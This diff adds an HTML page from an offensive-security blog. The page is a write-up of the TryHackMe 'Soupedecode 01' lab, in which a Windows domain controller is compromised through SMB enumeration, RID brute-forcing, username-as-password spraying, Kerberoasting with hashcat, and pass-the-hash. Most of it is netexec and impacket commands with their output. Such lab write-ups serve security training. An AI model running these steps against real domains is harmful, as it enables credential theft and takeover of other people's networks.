@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Soupedecode 01 - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Soupdecode 01</h1>
+<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-easy">Easy</span> <span class="tag tag-windows">Windows</span> <span class="tag tag-hash-cracking">Hash Cracking</span> <span class="tag tag-rid-brute-forcing">RID Brute Forcing</span> <span class="tag tag-kerberoasting">Kerberoasting</span> <span class="tag tag-pth">PTH</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/soupedecode01"><strong>Soupedecode</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this ocasion, I&#39;ll get access in a Windows Server 2022 Domain Controller by enumerating the SMB service, perform a RID bruteforce attack and Kerberoasting to privesc.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<pre><code>❯ ping -c 1 10.10.34.15
+PING 10.10.34.153 (10.10.34.153) 56(84) bytes of data.
+64 bytes from 10.10.34.153: icmp_seq=1 ttl=127 time=52.5 ms
+
+--- 10.10.34.153 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.486/52.486/52.486/0.000 ms
+</code></pre>
+<p>In this case, the target seems to be a Windows machine. Let&#39;s perform a port scan with nmap.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.34.153 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:47 CET
+Initiating SYN Stealth Scan at 18:47
+Scanning 10.10.34.153 [65535 ports]
+Discovered open port 3389/tcp on 10.10.34.153
+Discovered open port 53/tcp on 10.10.34.153
+Discovered open port 135/tcp on 10.10.34.153
+Discovered open port 445/tcp on 10.10.34.153
+Discovered open port 139/tcp on 10.10.34.153
+Discovered open port 49716/tcp on 10.10.34.153
+Discovered open port 593/tcp on 10.10.34.153
+Discovered open port 49798/tcp on 10.10.34.153
+Discovered open port 3268/tcp on 10.10.34.153
+Discovered open port 49664/tcp on 10.10.34.153
+Discovered open port 464/tcp on 10.10.34.153
+Discovered open port 49667/tcp on 10.10.34.153
+Discovered open port 3269/tcp on 10.10.34.153
+Discovered open port 88/tcp on 10.10.34.153
+Discovered open port 636/tcp on 10.10.34.153
+Discovered open port 389/tcp on 10.10.34.153
+Discovered open port 49675/tcp on 10.10.34.153
+Discovered open port 9389/tcp on 10.10.34.153
+Completed SYN Stealth Scan at 18:48, 40.06s elapsed (65535 total ports)
+Nmap scan report for 10.10.34.153
+Host is up, received user-set (0.16s latency).
+Scanned at 2025-11-01 18:47:45 CET for 40s
+Not shown: 65517 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49675/tcp open  unknown          syn-ack ttl 127
+49716/tcp open  unknown          syn-ack ttl 127
+49798/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 40.17 seconds
+           Raw packets sent: 196594 (8.650MB) | Rcvd: 55 (2.420KB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 10.10.34.153 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:54 CET
+Nmap scan report for 10.10.34.153
+Host is up (0.053s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   DNS-SD-TCP: 
+|     _services
+|     _dns-sd
+|     _udp
+|_    local
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 17:54:11Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
+| Not valid before: 2025-06-17T21:35:42
+|_Not valid after:  2025-12-17T21:35:42
+|_ssl-date: 2025-11-01T17:55:11+00:00; -2s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: SOUPEDECODE
+|   NetBIOS_Domain_Name: SOUPEDECODE
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: SOUPEDECODE.LOCAL
+|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-11-01T17:54:31+00:00
+9389/tcp open  mc-nmf        .NET Message Framing
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.95%I=7%D=11/1%Time=69064953%P=x86_64-pc-linux-gnu%r(DNS-
+SF:SD-TCP,30,&quot;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
+SF:_udp\x05local\0\0\x0c\0\x01&quot;);
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+| smb2-time: 
+|   date: 2025-11-01T17:54:32
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.75 seconds
+</code></pre>
+<p>Nmap found some open ports and we can extract a lot of information from this big output:</p>
+<ul>
+<li>Open ports like 53, 88, 139, 445... are a good indication that we are facing a <strong>Windows Domain Controller</strong>.</li>
+<li>In the port 3389/tcp there is Microsoft Terminal Services and the version is 10.0.20348, that is, <strong>Windows Server 2022</strong> Version 21H2.</li>
+<li>The FQDN of the targeted machine is <code>DC01.SOUPEDECODE.LOCAL</code> and the target domain is <code>SOUPEDECODE.LOCAL</code></li>
+</ul>
+<p>I&#39;ll add this in my <code>/etc/hosts</code> file:</p>
+<pre><code>10.10.34.153 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL
+</code></pre>
+<p>Using <strong>netexec</strong> I&#39;ll enumerate SMB shares and see if we can log in with the <code>guest</code> user and grants us read access to the <strong>IPC$</strong> share.</p>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u &#39;guest&#39; -p &#39;&#39; --shares
+SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.10.34.153    445    DC01             [*] Enumerated shares
+SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
+SMB         10.10.34.153    445    DC01             -----           -----------     ------
+SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.34.153    445    DC01             backup                          
+SMB         10.10.34.153    445    DC01             C$                              Default share
+SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.34.153    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.34.153    445    DC01             SYSVOL                          Logon server share 
+SMB         10.10.34.153    445    DC01             Users                           
+</code></pre>
+<p>We have read access to the $IPC shared resource.</p>
+<p>Now, we can perform a <strong>RID bruteforce attack</strong> with netexec to enumerate users.</p>
+<blockquote>
+<p>A <strong>RID brute-force attack</strong> generally refers to an attempt to crack or guess a <strong>Remote Identifier (RID)</strong>, which is typically a unique identifier used in network protocols, operating systems, or systems like Windows for user accounts, groups, or security principles.</p>
+</blockquote>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u &#39;guest&#39; -p &#39;&#39; --rid-brute 3000
+SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.10.34.153    445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.34.153    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
+SMB         10.10.34.153    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
+SMB         10.10.34.153    445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
+SMB         10.10.34.153    445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
+SMB         10.10.34.153    445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
+SMB         10.10.34.153    445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
+SMB         10.10.34.153    445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
+SMB         10.10.34.153    445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
+...
+SMB         10.10.34.153    445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
+SMB         10.10.34.153    445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
+SMB         10.10.34.153    445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
+...
+SMB         10.10.34.153    445    DC01             2168: SOUPEDECODE\admin (SidTypeUser)
+</code></pre>
+<p>I&#39;ll save in valid_usernames.txt a list with all the users for later.</p>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u &#39;guest&#39; -p &#39;&#39; --rid-brute 3000 | grep SidTypeUser | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 &gt; valid_usernames.txt
+</code></pre>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p>At this point we can try to bruteforce user&#39;s passwords using valid_usernames.txt and using the domain name, year, or some popular weak passwords, but all of that didn&#39;t worked.</p>
+<p>But there&#39;s something that worked. That was attempting to log in the domain using <strong>valid_usernames.txt both in the username and password fields</strong>.</p>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+</code></pre>
+<hr>
+<h2>Exploitation</h2>
+<p>We found the credentials <code>ybob317:ybob317</code></p>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u &#39;ybob317&#39; -p &#39;ybob317&#39; --shares
+SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+SMB         10.10.34.153    445    DC01             [*] Enumerated shares
+SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
+SMB         10.10.34.153    445    DC01             -----           -----------     ------
+SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.34.153    445    DC01             backup                          
+SMB         10.10.34.153    445    DC01             C$                              Default share
+SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.34.153    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.34.153    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.34.153    445    DC01             Users           READ            
+</code></pre>
+<p>Using those credentials we have read access to the Users shared resource. Let&#39;s access that resource to get the user flag.</p>
+<pre><code>❯ smbclient.py &#39;SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local&#39;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Users
+# cd ybob317/Desktop
+# ls
+drw-rw-rw-          0  Fri Jul 25 19:51:44 2025 .
+drw-rw-rw-          0  Mon Jun 17 19:24:32 2024 ..
+-rw-rw-rw-        282  Mon Jun 17 19:24:32 2024 desktop.ini
+-rw-rw-rw-         33  Fri Jul 25 19:51:44 2025 user.txt
+# get user.txt
+</code></pre>
+<hr>
+<h2>Post-Exploitation</h2>
+<blockquote>
+<p><strong>Kerberoasting</strong> is a post-exploitation attack technique targeting the Kerberos authentication protocol, enabling adversaries to extract encrypted service account credentials from Active Directory.</p>
+</blockquote>
+<pre><code>❯ nxc ldap 10.10.34.153 -u ybob317 -p ybob317 --kerberoast kerb.hash
+LDAP        10.10.34.153    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
+LDAP        10.10.34.153    389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+LDAP        10.10.34.153    389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.10.34.153    389    DC01             [*] Total of records returned 5
+LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: file_svc, memberOf: [], pwdLastSet: 2024-06-17 19:32:23.726085, lastLogon: &lt;never&gt;
+LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$...
+LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: firewall_svc, memberOf: [], pwdLastSet: 2024-06-17 19:28:32.710125, lastLogon: &lt;never&gt;
+LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\firewall_svc*$...
+LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: backup_svc, memberOf: [], pwdLastSet: 2024-06-17 19:28:49.476511, lastLogon: &lt;never&gt;
+LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\backup_svc*$...
+LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2024-06-17 19:29:04.569417, lastLogon: &lt;never&gt;
+LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\web_svc*$...
+LDAP        10.10.34.153    389    DC01             [*] sAMAccountName: monitoring_svc, memberOf: [], pwdLastSet: 2024-06-17 19:29:18.511871, lastLogon: &lt;never&gt;
+LDAP        10.10.34.153    389    DC01             $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\monitoring_svc*$...
+</code></pre>
+<p>Those are the accounts vulnerable to Kerberoasting, that&#39;s to say, we can <strong>crack their password hashes</strong> with <strong>hashcat</strong>.</p>
+<pre><code>❯ hashcat kerb.hash /usr/share/wordlists/rockyou.txt
+...
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$...:***REDACTED_PASSWORD***
+</code></pre>
+<p>We have the credentials of the <code>file_svc</code> user. Let&#39;s start enumerating shared resources again.</p>
+<pre><code>❯ nxc smb dc01.soupedecode.local -u &#39;file_svc&#39; -p &#39;***REDACTED_PASSWORD***&#39; --shares
+SMB         10.10.34.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:***REDACTED_PASSWORD***
+SMB         10.10.34.153    445    DC01             [*] Enumerated shares
+SMB         10.10.34.153    445    DC01             Share           Permissions     Remark
+SMB         10.10.34.153    445    DC01             -----           -----------     ------
+SMB         10.10.34.153    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.34.153    445    DC01             backup          READ            
+SMB         10.10.34.153    445    DC01             C$                              Default share
+SMB         10.10.34.153    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.34.153    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.34.153    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.34.153    445    DC01             Users            
+</code></pre>
+<p><img src="/assets/images/soupedecode-01/backup.png" alt=""></p>
+<p>It seems we got a hashdump of some machine accounts. Let&#39;s see if any of them is valid.</p>
+<pre><code>❯ cat backup_extract.txt | cut -d: -f1 &gt; backup_users.txt
+❯ cat backup_extract.txt | cut -d: -f4 &gt; backup_hashes.txt
+❯ nxc smb 10.10.34.153 -u backup_users.txt -H backup_hashes.txt --no-brute
+...
+SMB         10.10.34.153    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+</code></pre>
+<p>Now let&#39;s get a shell in the machine using <code>impacket-psexec</code></p>
+<p><img src="/assets/images/soupedecode-01/root_flag.png" alt=""></p>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
